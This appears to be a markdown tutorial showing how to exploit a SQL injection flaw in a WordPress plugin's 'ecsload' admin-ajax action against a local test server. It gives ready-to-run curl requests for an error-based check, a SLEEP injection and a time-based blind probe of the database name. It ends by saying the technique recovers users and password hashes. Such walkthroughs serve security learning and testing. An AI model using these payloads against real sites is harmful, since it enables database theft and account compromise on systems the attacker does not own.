# Vulnerability Exploit Examples

Written by Wellington Espindula based on online exploit examples.

## 1 - First steps into this flaw

 This first example is to verify if the wordpress is vulnerable.

```bash
curl -i --compressed -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'User-Agent: python-requests/2.28.1' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept: */*' -H $'Connection: keep-alive' -H $'Content-Length: 287' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'action=ecsload&query=%7b%22tax_query%22%3a%7b%220%22%3a%7b%22field%22%3a%22term_taxonomy_id%22%2c%22terms%22%3a%5b%22%22%5d%7d%7d%7d&ecs_ajax_settings=%7b%22post_id%22%3a%221%22%2c%20%22current_page%22%3a1%2c%20%22widget_id%22%3a1%2c%20%22theme_id%22%3a1%2c%20%22max_num_pages%22%3a10%7d' \
    $'http://127.0.0.1:8000/wp-admin/admin-ajax.php'
```

 We sent the parameters above as binary data, but the parameters as setted as below:

 ```json
 action = ecsload
 query = {"tax_query":{"0":{"field":"term_taxonomy_id","terms":[""]}}}
 ecs_ajax_settings = {"post_id":"1", "current_page":1, "widget_id":1, "theme_id":1, "max_num_pages":10}
 ```

 If you get the result as below, your wordpress page is vulnerable to it:

 ```html
<div id="error">
    <p class="wpdberror"><strong>WordPress database error:</strong> [You have an error in your SQL syntax; check the
        manual that corresponds to your MySQL server version for the right syntax to use near &#039;)
        ) AND wp_posts.post_type IN (&#039;post&#039;, &#039;page&#039;, &#039;attachment&#039;,
        &#039;e-landing-page&#039;) A&#039; at line
        2]<br /><code>SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) LEFT JOIN wp_posts AS p2 ON (wp_posts.post_parent = p2.ID)  WHERE 1=1  AND ( 
      wp_term_relationships.term_taxonomy_id IN ()
    ) AND wp_posts.post_type IN (&#039;post&#039;, &#039;page&#039;, &#039;attachment&#039;, &#039;e-landing-page&#039;) AND (((wp_posts.post_status = &#039;publish&#039;) OR (wp_posts.post_status = &#039;inherit&#039; AND (p2.post_status = &#039;publish&#039;)))) GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 10, 10</code>
    </p>
</div>
<div data-elementor-type="wp-post" data-elementor-id="1" class="elementor elementor-1 elementor-bc-flex-widget">
    <p>There has been a critical error on this website.</p>
    <p><a href="https://wordpress.org/support/article/faq-troubleshooting/">Learn more about troubleshooting
            WordPress.</a></p>
 ```

## 2 - Second example

For going a little bit further into this vulnerability, we can start to play with it.
This second example injects the SQL SLEEP primitive.

For explore it, we'll change our query to put our malicious code:

```json
query = {"tax_query":{"0":{"field":"term_taxonomy_id","terms":["1) OR SLEEP(10)#"]}}}
```

We'll get the following curl command:

```bash
curl -i --compressed -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'User-Agent: python-requests/2.28.1' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept: */*' -H $'Connection: keep-alive' -H $'Content-Length: 309' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'action=ecsload&query=%7b%22tax_query%22%3a%7b%220%22%3a%7b%22field%22%3a%22term_taxonomy_id%22%2c%22terms%22%3a%5b%221)%20OR%20SLEEP(10)%23%22%5d%7d%7d%7d&ecs_ajax_settings=%7b%22post_id%22%3a%221%22%2c%20%22current_page%22%3a1%2c%20%22widget_id%22%3a1%2c%20%22theme_id%22%3a1%2c%20%22max_num_pages%22%3a10%7d' \
    $'http://127.0.0.1:8000/wp-admin/admin-ajax.php'
```

Here we can get as result an error page. But it's nice to verify as we increase the sleep value, the time the server takes to respond increase.

If you want to, it's possible to use the command `time` to measure the time server takes to respond and compare both of them.

## 3 - Third example

As we see in the previous section, it's possible to execute some SQL primitives such as SLEEP.
Now we're going to use SLEEP to discover information from the database.
Since we already know the database name for this example is `wordpress`, we are going to use this information in this step.
Now we are going to change our query to verify if the database name is the one we "guessed".

```json
query = {"tax_query":{"0":{"field":"term_taxonomy_id","terms":["(CASE WHEN database() = 'wordpress' THEN SLEEP(10) ELSE 2070 END)"]}}}
```

```bash
curl -i --compressed -k -X $'POST' \
    -H $'Host: 127.0.0.1:8000' -H $'User-Agent: python-requests/2.28.1' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept: */*' -H $'Connection: keep-alive' -H $'Content-Length: 372' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'action=ecsload&query=%7b%22tax_query%22%3a%7b%220%22%3a%7b%22field%22%3a%22term_taxonomy_id%22%2c%22terms%22%3a%5b%22(CASE%20WHEN%20database()%20%3d%20\'wordpress\'%20THEN%20SLEEP(5)%20ELSE%202070%20END)%22%5d%7d%7d%7d&ecs_ajax_settings=%7b%22post_id%22%3a%221%22%2c%20%22current_page%22%3a1%2c%20%22widget_id%22%3a1%2c%20%22theme_id%22%3a1%2c%20%22max_num_pages%22%3a10%7d' \
    $'http://127.0.0.1:8000/wp-admin/admin-ajax.php'
```

## Finally

With those examples, it's easy to understand how our exploit works. It tries to guess the size of the string and with that, it tries to find the string, character by character based on the webserver response time.
With that, it's easy to find the users and the encryped passwords.
